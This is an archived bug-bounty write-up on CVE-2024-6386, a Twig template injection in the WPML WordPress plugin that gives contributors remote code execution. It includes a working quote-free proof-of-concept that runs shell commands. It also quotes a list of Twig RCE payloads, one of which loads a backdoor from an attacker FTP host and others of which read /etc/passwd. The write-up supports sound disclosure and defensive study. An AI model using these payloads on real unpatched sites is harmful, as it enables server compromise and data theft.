---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-08-21_wpml-multilingual-cms-authenticated-contributor-remote-code-execution-rce-via-tw.md
original_filename: 2024-08-21_wpml-multilingual-cms-authenticated-contributor-remote-code-execution-rce-via-tw.md
title: WPML Multilingual CMS Authenticated Contributor+ Remote Code Execution (RCE)
  via Twig Server-Side Template Injection (SSTI)
category: documents
detected_topics:
- command-injection
tags:
- imported
- documents
- command-injection
language: en
raw_sha256: e5ad069947612a010b8e3ae5abe02020295c6348d4d789b7b16200aeba871da9
text_sha256: db7267d0ca885dc21e6656d0565be9f377df37be1f7b1fd4effb7b8d8ac5469c
ingested_at: '2026-06-28T07:32:37Z'
sensitivity: unknown
redactions_applied: true
---

# WPML Multilingual CMS Authenticated Contributor+ Remote Code Execution (RCE) via Twig Server-Side Template Injection (SSTI)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-08-21_wpml-multilingual-cms-authenticated-contributor-remote-code-execution-rce-via-tw.md
- Source Type: markdown
- Detected Topics: command-injection
- Ingested At: 2026-06-28T07:32:37Z
- Redactions Applied: True
- Raw SHA256: `e5ad069947612a010b8e3ae5abe02020295c6348d4d789b7b16200aeba871da9`
- Text SHA256: `db7267d0ca885dc21e6656d0565be9f377df37be1f7b1fd4effb7b8d8ac5469c`


## Content

---
title: "WPML Multilingual CMS Authenticated Contributor+ Remote Code Execution (RCE) via Twig Server-Side Template Injection (SSTI)"
page_title: "WPML Multilingual CMS Authenticated Contributor+ Remote Code Execution (RCE) via Twig Server-Side Template Injection (SSTI) · Stealthcopter"
url: "https://sec.stealthcopter.com/wpml-rce-via-twig-ssti/"
final_url: "https://sec.stealthcopter.com/wpml-rce-via-twig-ssti/"
authors: ["Matthew Rollings (@stealthcopter)"]
programs: ["Wordfence"]
bugs: ["SSTI", "RCE", "Security code review"]
bounty: "1,639"
publication_date: "2024-08-21"
added_date: "2024-08-22"
source: "pentester.land/writeups.json"
original_index: 53
---

[BugBounty](/tags/bugbounty) [Hacking](/tags/hacking) [WordPress](/tags/wordpress)

# WPML Multilingual CMS Authenticated Contributor+ Remote Code Execution (RCE) via Twig Server-Side Template Injection (SSTI)

  * [![stealthcopter](https://sec.stealthcopter.com/content/images/size/w100/2024/07/f894d5600bcba5e947d6dde37a3cec1b.png)](/authors/stealthcopter)

#### [stealthcopter](/authors/stealthcopter)

21 August 2024 • 6 min read

![](https://sec.stealthcopter.com/content/images/2024/06/_f62835b4-bc73-4988-92d3-d9e9593aef80.jpeg)

## tldr;

Server-Side Template Injection (SSTI) is one of my favorite vulnerabilities, but rarely do I see it outside of CTF competitions…

The WPML Multilingual CMS Plugin for WordPress used by over 1 million sites is susceptible to an Authenticated (Contributor+) Remote Code Execution (RCE) vulnerability through a Twig server-side template injection.

**Affected Versions:** <= 4.6.11 **CVSS Score:** 9.9  
**CVE-ID** : CVE-2024-6386  
**Links:** [Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6386&ref=sec.stealthcopter.com), [NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-6386?ref=sec.stealthcopter.com)  
**Active installations** : 1,000,000+  
**Bounty** : $1,639 ([Wordfence](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/sitepress-multilingual-cms/wpml-multilingual-cms-4612-authenticatedcontributor-remote-code-execution-via-twig-server-side-template-injection?ref=sec.stealthcopter.com))

## About WPML Multilingual CMS

[WPML](https://wpml.org/?ref=sec.stealthcopter.com) is a popular plugin for creating multilingual WordPress sites. It offers a robust set of features for managing translations and language switching, making it a top choice for many WordPress users who need multilingual capabilities. WPML is a premium plugin charging between €39 and €199 per year.

![WPML Website Screenshot](/content/images/2024/06/Screenshot-from-2024-06-27-17-32-19.png)

WPML Website Screenshot

## Vulnerability

The vulnerability lies in the handling of [shortcodes](https://codex.wordpress.org/Shortcode?ref=sec.stealthcopter.com) within the WPML plugin. Specifically, the plugin uses Twig templates for rendering content in shortcodes but fails to properly sanitize input, leading to server-side template injection (SSTI).

In the code, the `callback` function in `class-wpml-ls-shortcodes.php` processes shortcode content:
  
  
  add_shortcode( 'wpml_language_switcher', array( $this, 'callback' ) );
  
  // Backward compatibility
  add_shortcode( 'wpml_language_selector_widget', array( $this, 'callback' ) );
  add_shortcode( 'wpml_language_selector_footer', array( $this, 'callback' ) );
  

Where the `callback` function is:
  
  
  public function callback( $args, $content = null, $tag = '' ) {
  $args = (array) $args;
  $args = $this->parse_legacy_shortcodes( $args, $tag );
  $args = $this->convert_shortcode_args_aliases( $args );
  
  return $this->render( $args, $content );
  }
  

This calls the `render` function in `class-wpml-ls-public-api.php`, passing the shortcode content as the `twig_template` variable:
  
  
  protected function render( $args, $twig_template = null ) {
  $defaults_slot_args = $this->get_default_slot_args( $args );
  $slot_args  = array_merge( $defaults_slot_args, $args );
  
  $slot = $this->get_slot_factory()->get_slot( $slot_args );
  $slot->set( 'show', 1 );
  $slot->set( 'template_string', $twig_template );
  
  if ( $slot->is_post_translations() ) {
  $output = $this->render->post_translations_label( $slot );
  } else {
  $output = $this->render->render( $slot );
  }
  
  return $output;
  }
  

And this variable is then rendered as a twig template string.

## Payload Construction

The shortcode below will demonstrate that it’s contents will be rendered as a twig template:
  
  
  [wpml_language_switcher]
  {{ 4 * 7 }}
  [/wpml_language_switcher]
  

When saved we will see the output of `28` on the page.

[![](/content/images/size/w1000/2024/06/Screenshot-from-2024-06-27-14-32-53.png)](/content/images/size/w1000/2024/06/Screenshot-from-2024-06-27-14-32-53.png)

[![](/content/images/size/w1000/2024/06/Screenshot-from-2024-06-27-14-33-14.png)](/content/images/size/w1000/2024/06/Screenshot-from-2024-06-27-14-33-14.png)

1\. Entering the test payload into the editor, 2. Execution of the test payload when rendering the post preview![Bingpot! We have SSTI!](/content/images/bingpot.gif)

Bingpot! We have SSTI!

But there’s a slight complication here that must be overcome to exploit further. This is the fact that WordPress will HTML encode any single or double quotes. This means we cannot execute any of the classic Twig template injection to remote code execution combos, such as those below (taken from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md?ref=sec.stealthcopter.com#twig---code-execution)):
  
  
  {{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
  {{['id']|filter('system')}}
  {{[0]|reduce('system','id')}}
  {{['id']|map('system')|join}}
  {{['id',1]|sort('system')|join}}
  {{['cat\x20/etc/passwd']|filter('system')}}
  {{['cat$IFS/etc/passwd']|filter('system')}}
  {{['id']|filter('passthru')}}
  {{['id']|map('passthru')}}
  

However, we can start by exploring what we _do_ have access to, for example:
  
  
  [wpml_language_switcher]
  {{ dump() }}
  [/wpml_language_switcher]
  

This will output something like the following (but not as pretty):
  
  
  array(4) {
  ["languages"]=> array(1) {
  ["en"]=> array(8) {
  ["code"]=> string(2) "en"
  ["url"]=> string(34) "http://wordpress.local:1337/?p=126"
  ["native_name"]=> string(7) "English"
  ["display_name"]=> string(7) "English"
  ["is_current"]=> bool(true)
  ["css_classes"]=> string(121) "wpml-ls-slot-shortcode_actions wpml-ls-item wpml-ls-item-en wpml-ls-current-language wpml-ls-first-item wpml-ls-last-item"
  ["flag_width"]=> int(18)
  ["flag_height"]=> int(12)
  }
  }
  ["current_language_code"]=> string(2) "en"
  ["css_classes"]=> string(41) "wpml-ls-statics-shortcode_actions wpml-ls"
  ["css_classes_link"]=> string(12) "wpml-ls-link"
  }
  

This output provides enough letters that we can start using it to create customer strings. For example, we can create `s` by:
  
  
  {% set s = dump(current_language_code)|slice(0,1) %}
  

This works by grabbing the first letter from the output of `dump` on the variable `current_language_code`, this will always be s as it is a string and dump always prints `string(n)` before the contents of the string.

ℹ️

Note when choosing variables to grab the characters from, it’s best to opt for those that are going to be the most stable. This will make the exploit more reliable between different environments.

This can be repeated until we have the chars to spell out system which will allow us to execute arbitrary commands. Here use the ~ operator to join the chars together into a string. For example, once we have the letters defined, the basic id command can be executed as follows:
  
  
  {% set system = s~y~s~t~e~m %}
  {% set id = i~d %}
  {{[id]|map(system)|join}}
  

Once we have the ability to execute shell commands we can even use the output from the shell to give us access to further letter we may find difficult to obtain via templating. This can be seen in the snippet below, where a slash `/` is obtained from the output of the `pwd` shell command:
  
  
  {% set slash = [pwd]|map(system)|join|slice(0,1) %}
  

This works because `pwd` (print working directory) will always start with a `/` in Linux, e.g. `/home/username/`

ℹ️

After submission Ivan from Wordfence pointed out another (simpler/better) trick to get the specific letters by starting the shortcode template with all the letters you need `[wpml_language_switcher]abcde...` and then obtaining them by using `self` and slicing the string to get each char.

## Proof of Concept

Now that we’ve demonstrated the basics, lets jump in and look at the final proof-of-concept created to exploit this vulnerability:
  
  
  [wpml_language_switcher]
  
  {# Find letters we need as we cant use any quotes #}
  {% set s = dump(current_language_code)|slice(0,1) %}
  {% set t = dump(current_language_code)|slice(1,1) %}
  {% set r = dump(current_language_code)|slice(2,1) %}
  {% set i = dump(current_language_code)|slice(3,1) %}
  {% set n = dump(current_language_code)|slice(4,1) %}
  {% set g = dump(current_language_code)|slice(5,1) %}
  {% set a = dump()|slice(0,1) %}
  {% set y = dump()|slice(4,1) %}
  {% set e = dump(css_classes)|slice(36,1) %}
  {% set w = dump(css_classes)|slice(12,1) %}
  {% set p = dump(css_classes)|slice(13,1) %}
  {% set m = dump(css_classes)|slice(14,1) %}
  {% set d = dump(css_classes)|slice(35,1) %}
  {% set c = dump(css_classes)|slice(25,1) %}
  {% set space = dump(css_classes)|slice(45,1) %}
  
  {% set system = s~y~s~t~e~m %}
  {% set id = i~d %}
  {% set pwd=***REDACTED*** %}
  
  We can use the output from `dump` or any other similar function to grab any letters we need to create our strings.
  
  Once we have code basic code execution we can use that to grab any letters we may not be able to easily grab via template injection.
  
  {% set slash = [pwd]|map(system)|join|slice(0,1) %}
  
  {% set passwd=***REDACTED*** %}
  
  
  Debug: {{dump()}}
  
  Command: {{system}} {{id}} {{pwd}}
  
  id: {{[id]|map(system)|join}}
  
  pwd=***REDACTED***
  
  passwd=***REDACTED***
  
  [/wpml_language_switcher]
  

## Exploitation

By using the above payload, a Contributor+ user can gain command execution on the server. The crafted payload uses the dump function to gather letters needed to construct commands without using quotes. Once we have basic command execution, we can further leverage it to gain more control over the server.

[![](/content/images/size/w1000/2024/06/Screenshot-from-2024-06-27-14-35-48.png)](/content/images/size/w1000/2024/06/Screenshot-from-2024-06-27-14-35-48.png)

[![](/content/images/size/w1000/2024/06/Screenshot-from-2024-06-27-14-38-17.png)](/content/images/size/w1000/2024/06/Screenshot-from-2024-06-27-14-38-17.png)

1\. Entering the final payload into the editor, 2. Execution of the final payload when rendering the post preview

## Timeline

  * **19/06/24 (0 day)** \- Discovery and disclosure to Wordfence
  * **27/06/24 (+8 day)** \- Wordfence validated and assigned CVE
  * **27/06/24 (+8 days)** \- $1,639 bounty assigned by Wordfence
  * **20/08/24 (+62 days)** \- Patch released in version [4.6.13](https://wpml.org/changelog/2024/08/wpml-4-6-13-and-woocommerce-multilingual-5-3-7-security-and-other-enhancements/?ref=sec.stealthcopter.com)
  * **21/08/24 (+63 days)** \- Vulnerability publicly disclosed

## Conclusion

This vulnerability is a classic example of the dangers of improper input sanitization in templating engines. Developers should always sanitize and validate user inputs, especially when dealing with dynamic content rendering. This case serves as a reminder that security is a continuous process, requiring vigilance at every stage of development and data processing.

Share This:

  * [](https://www.facebook.com/sharer.php?u=https%3a%2f%2fsec.stealthcopter.com%2fwpml-rce-via-twig-ssti%2f&t=WPML%20Multilingual%20CMS%20Authenticated%20Contributor%2b%20Remote%20Code%20Execution%20%28RCE%29%20via%20Twig%20Server-Side%20Template%20Injection%20%28SSTI%29)
  * [](https://bsky.app/intent/compose?text=WPML%20Multilingual%20CMS%20Authenticated%20Contributor%2b%20Remote%20Code%20Execution%20%28RCE%29%20via%20Twig%20Server-Side%20Template%20Injection%20%28SSTI%29%20https%3a%2f%2fsec.stealthcopter.com%2fwpml-rce-via-twig-ssti%2f)
  * [](https://twitter.com/intent/tweet?text=WPML%20Multilingual%20CMS%20Authenticated%20Contributor%2b%20Remote%20Code%20Execution%20%28RCE%29%20via%20Twig%20Server-Side%20Template%20Injection%20%28SSTI%29&url=https%3a%2f%2fsec.stealthcopter.com%2fwpml-rce-via-twig-ssti%2f)
  * [](https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fsec.stealthcopter.com%2fwpml-rce-via-twig-ssti%2f&title=WPML%20Multilingual%20CMS%20Authenticated%20Contributor%2b%20Remote%20Code%20Execution%20%28RCE%29%20via%20Twig%20Server-Side%20Template%20Injection%20%28SSTI%29&summary=summary%3dtldr%253B%2bServer-Side%2bTemplate%2bInjection%2b%2528SSTI%2529%2bis%2bone%2bof%2bmy%2bfavorite%2bvulnerabilities%252C%2bbut%2brarely%2bdo%2bI%2bsee%2bit%2boutside%2bof%2bCTF%2bcompetitions%2526hellip%253B%250AThe%2bWPML%2bMultilingual%2bCMS%2bPlugin%2bfor%2bWordPress%2bused%2bby%2b%25E2%2580%25A6)
  * [](whatsapp://send?text=WPML%20Multilingual%20CMS%20Authenticated%20Contributor%2b%20Remote%20Code%20Execution%20%28RCE%29%20via%20Twig%20Server-Side%20Template%20Injection%20%28SSTI%29%0a%0atldr%3b%20Server-Side%20Template%20Injection%20%28SSTI%29%20is%20one%20of%20my%20favorite%20vulnerabilities%2c%20but%20rarely%20do%20I%20see%20it%20outside%20of%20CTF%20competitions%26hellip%3b%0aThe%20WPML%20Multilingual%20CMS%20Plugin%20for%20WordPress%20used%20by%20%e2%80%a6%0a%0ahttps%3a%2f%2fsec.stealthcopter.com%2fwpml-rce-via-twig-ssti%2f%0a)
  * [](/cdn-cgi/l/email-protection#87b8f4f2e5ede2e4f3bad0d7cacba2b5b7caf2ebf3eeebeee9e0f2e6eba2b5b7c4cad4a2b5b7c6f2f3efe2e9f3eee4e6f3e2e3a2b5b7c4e8e9f3f5eee5f2f3e8f5a2b5e5a2b5b7d5e2eae8f3e2a2b5b7c4e8e3e2a2b5b7c2ffe2e4f2f3eee8e9a2b5b7a2b5bfd5c4c2a2b5bea2b5b7f1eee6a2b5b7d3f0eee0a2b5b7d4e2f5f1e2f5aad4eee3e2a2b5b7d3e2eaf7ebe6f3e2a2b5b7cee9ede2e4f3eee8e9a2b5b7a2b5bfd4d4d3cea2b5bea1e5e8e3febad0d7cacba2b5b7caf2ebf3eeebeee9e0f2e6eba2b5b7c4cad4a2b5b7c6f2f3efe2e9f3eee4e6f3e2e3a2b5b7c4e8e9f3f5eee5f2f3e8f5a2b5e5a2b5b7d5e2eae8f3e2a2b5b7c4e8e3e2a2b5b7c2ffe2e4f2f3eee8e9a2b5b7a2b5bfd5c4c2a2b5bea2b5b7f1eee6a2b5b7d3f0eee0a2b5b7d4e2f5f1e2f5aad4eee3e2a2b5b7d3e2eaf7ebe6f3e2a2b5b7cee9ede2e4f3eee8e9a2b5b7a2b5bfd4d4d3cea2b5bea2b7e6a2b7e6f3ebe3f5a2b4e5a2b5b7d4e2f5f1e2f5aad4eee3e2a2b5b7d3e2eaf7ebe6f3e2a2b5b7cee9ede2e4f3eee8e9a2b5b7a2b5bfd4d4d3cea2b5bea2b5b7eef4a2b5b7e8e9e2a2b5b7e8e1a2b5b7eafea2b5b7e1e6f1e8f5eef3e2a2b5b7f1f2ebe9e2f5e6e5eeebeef3eee2f4a2b5e4a2b5b7e5f2f3a2b5b7f5e6f5e2ebfea2b5b7e3e8a2b5b7cea2b5b7f4e2e2a2b5b7eef3a2b5b7e8f2f3f4eee3e2a2b5b7e8e1a2b5b7c4d3c1a2b5b7e4e8eaf7e2f3eef3eee8e9f4a2b5b1efe2ebebeef7a2b4e5a2b7e6d3efe2a2b5b7d0d7cacba2b5b7caf2ebf3eeebeee9e0f2e6eba2b5b7c4cad4a2b5b7d7ebf2e0eee9a2b5b7e1e8f5a2b5b7d0e8f5e3d7f5e2f4f4a2b5b7f2f4e2e3a2b5b7e5fea2b5b7a2e2b5a2bfb7a2e6b1a2b7e6a2b7e6eff3f3f7f4a2b4e6a2b5e1a2b5e1f4e2e4a9f4f3e2e6ebf3efe4e8f7f3e2f5a9e4e8eaa2b5e1f0f7eaebaaf5e4e2aaf1eee6aaf3f0eee0aaf4f4f3eea2b5e1a2b7e6)
